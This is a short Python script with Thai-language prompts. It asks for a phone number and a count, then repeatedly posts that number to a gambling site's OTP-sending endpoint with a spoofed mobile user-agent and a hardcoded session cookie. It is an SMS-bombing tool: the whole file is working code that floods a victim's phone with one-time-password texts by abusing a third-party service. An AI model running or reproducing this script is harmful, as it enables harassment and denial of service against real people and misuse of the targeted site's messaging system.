import requests

print('\n')

phone=input('เบอร์ => ')
num=int(input('จำนวน => '))
print('\n')

for i in range(num):
  requests.post('https://ampbet.co/auth/send_otp',data=f'phone={phone}&otp=&password=&bank=&bank_number=&full_name=&ref=',headers={
  'content-type': 'application/x-www-form-urlencoded',
  'user-agent': 'Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36',
  'cookie': 'ampbet=ijihfj6bk8qd7r0vb3quhcvk3hqpvdck'
  })
  print(f'send to {phone} succeed\n')
